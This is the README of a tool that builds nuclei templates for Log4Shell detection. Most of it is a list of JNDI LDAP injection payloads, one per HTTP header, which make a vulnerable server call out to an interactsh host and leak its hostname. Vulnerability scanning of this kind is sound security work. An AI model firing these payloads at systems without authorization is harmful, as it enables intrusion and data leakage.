# Generate nuclei template for log4shell(log4j) detection from a header file

header list taken from:
`https://github.com/fullhunt/log4j-scan/blob/master/headers-large.txt`
check for updates:

##Instalation

```
git clone https://github.com/SirAppSec/nuclei-template-generator-log4j.git
pip install unidecode #for slugification
```

Usage:
```
python3 gen.py -f headers-small.txt -o headers.txt
```

Example Output:
```
Referer: ${jndi:ldap://${hostName}.referer.{{interactsh-url}}}
X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
Accept-Charset: ${jndi:ldap://${hostName}.acceptcharset.{{interactsh-url}}}
Accept-Datetime: ${jndi:ldap://${hostName}.acceptdatetime.{{interactsh-url}}}
Accept-Encoding: ${jndi:ldap://${hostName}.acceptencoding.{{interactsh-url}}}
Accept-Language: ${jndi:ldap://${hostName}.acceptlanguage.{{interactsh-url}}}
Cookie: ${jndi:ldap://${hostName}.cookie.{{interactsh-url}}}
Forwarded: ${jndi:ldap://${hostName}.forwarded.{{interactsh-url}}}
Forwarded-For: ${jndi:ldap://${hostName}.forwardedfor.{{interactsh-url}}}
Forwarded-For-Ip: ${jndi:ldap://${hostName}.forwardedforip.{{interactsh-url}}}
Forwarded-Proto: ${jndi:ldap://${hostName}.forwardedproto.{{interactsh-url}}}
From: ${jndi:ldap://${hostName}.from.{{interactsh-url}}}
TE: ${jndi:ldap://${hostName}.te.{{interactsh-url}}}
True-Client-IP: ${jndi:ldap://${hostName}.trueclientip.{{interactsh-url}}}
Upgrade: ${jndi:ldap://${hostName}.upgrade.{{interactsh-url}}}
User-Agent: ${jndi:ldap://${hostName}.useragent.{{interactsh-url}}}
Via: ${jndi:ldap://${hostName}.via.{{interactsh-url}}}
Warning: ${jndi:ldap://${hostName}.warning.{{interactsh-url}}}
X-Api-Version: ${jndi:ldap://${hostName}.xapiversion.{{interactsh-url}}}
Max-Forwards: ${jndi:ldap://${hostName}.maxforwards.{{interactsh-url}}}
Origin: ${jndi:ldap://${hostName}.origin.{{interactsh-url}}}
Pragma: ${jndi:ldap://${hostName}.pragma.{{interactsh-url}}}
DNT: ${jndi:ldap://${hostName}.dnt.{{interactsh-url}}}
Cache-Control: ${jndi:ldap://${hostName}.cachecontrol.{{interactsh-url}}}
X-Att-Deviceid: ${jndi:ldap://${hostName}.xattdeviceid.{{interactsh-url}}}
X-ATT-DeviceId: ${jndi:ldap://${hostName}.xattdeviceid.{{interactsh-url}}}
X-Correlation-ID: ${jndi:ldap://${hostName}.xcorrelationid.{{interactsh-url}}}
X-Csrf-Token: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
X-CSRFToken: ${jndi:ldap://${hostName}.xcsrftoken.{{interactsh-url}}}
X-Do-Not-Track: ${jndi:ldap://${hostName}.xdonottrack.{{interactsh-url}}}
X-Foo: ${jndi:ldap://${hostName}.xfoo.{{interactsh-url}}}
X-Foo-Bar: ${jndi:ldap://${hostName}.xfoobar.{{interactsh-url}}}
X-Forwarded: ${jndi:ldap://${hostName}.xforwarded.{{interactsh-url}}}
X-Forwarded-By: ${jndi:ldap://${hostName}.xforwardedby.{{interactsh-url}}}
X-Forwarded-For: ${jndi:ldap://${hostName}.xforwardedfor.{{interactsh-url}}}
X-Forwarded-For-Original: ${jndi:ldap://${hostName}.xforwardedfororiginal.{{interactsh-url}}}
X-Forwarded-Host: ${jndi:ldap://${hostName}.xforwardedhost.{{interactsh-url}}}
X-Forwarded-Port: ${jndi:ldap://${hostName}.xforwardedport.{{interactsh-url}}}
X-Forwarded-Proto: ${jndi:ldap://${hostName}.xforwardedproto.{{interactsh-url}}}
X-Forwarded-Protocol: ${jndi:ldap://${hostName}.xforwardedprotocol.{{interactsh-url}}}
X-Forwarded-Scheme: ${jndi:ldap://${hostName}.xforwardedscheme.{{interactsh-url}}}
X-Forwarded-Server: ${jndi:ldap://${hostName}.xforwardedserver.{{interactsh-url}}}
X-Forwarded-Ssl: ${jndi:ldap://${hostName}.xforwardedssl.{{interactsh-url}}}
X-Forwarder-For: ${jndi:ldap://${hostName}.xforwarderfor.{{interactsh-url}}}
X-Forward-For: ${jndi:ldap://${hostName}.xforwardfor.{{interactsh-url}}}
X-Forward-Proto: ${jndi:ldap://${hostName}.xforwardproto.{{interactsh-url}}}
X-Frame-Options: ${jndi:ldap://${hostName}.xframeoptions.{{interactsh-url}}}
X-From: ${jndi:ldap://${hostName}.xfrom.{{interactsh-url}}}
X-Geoip-Country: ${jndi:ldap://${hostName}.xgeoipcountry.{{interactsh-url}}}
X-Http-Destinationurl: ${jndi:ldap://${hostName}.xhttpdestinationurl.{{interactsh-url}}}
X-Http-Host-Override: ${jndi:ldap://${hostName}.xhttphostoverride.{{interactsh-url}}}
X-Http-Method: ${jndi:ldap://${hostName}.xhttpmethod.{{interactsh-url}}}
X-Http-Method-Override: ${jndi:ldap://${hostName}.xhttpmethodoverride.{{interactsh-url}}}
X-HTTP-Method-Override: ${jndi:ldap://${hostName}.xhttpmethodoverride.{{interactsh-url}}}
X-Http-Path-Override: ${jndi:ldap://${hostName}.xhttppathoverride.{{interactsh-url}}}
X-Https: ${jndi:ldap://${hostName}.xhttps.{{interactsh-url}}}
X-Htx-Agent: ${jndi:ldap://${hostName}.xhtxagent.{{interactsh-url}}}
X-Hub-Signature: ${jndi:ldap://${hostName}.xhubsignature.{{interactsh-url}}}
X-If-Unmodified-Since: ${jndi:ldap://${hostName}.xifunmodifiedsince.{{interactsh-url}}}
X-Imbo-Test-Config: ${jndi:ldap://${hostName}.ximbotestconfig.{{interactsh-url}}}
X-Insight: ${jndi:ldap://${hostName}.xinsight.{{interactsh-url}}}
X-Ip: ${jndi:ldap://${hostName}.xip.{{interactsh-url}}}
X-Ip-Trail: ${jndi:ldap://${hostName}.xiptrail.{{interactsh-url}}}
X-ProxyUser-Ip: ${jndi:ldap://${hostName}.xproxyuserip.{{interactsh-url}}}
X-Requested-With: ${jndi:ldap://${hostName}.xrequestedwith.{{interactsh-url}}}
X-Request-ID: ${jndi:ldap://${hostName}.xrequestid.{{interactsh-url}}}
X-UIDH: ${jndi:ldap://${hostName}.xuidh.{{interactsh-url}}}
X-Wap-Profile: ${jndi:ldap://${hostName}.xwapprofile.{{interactsh-url}}}
X-XSRF-TOKE: ${jndi:ldap://${hostName}.xxsrftoken.{{interactsh-url}}}

```
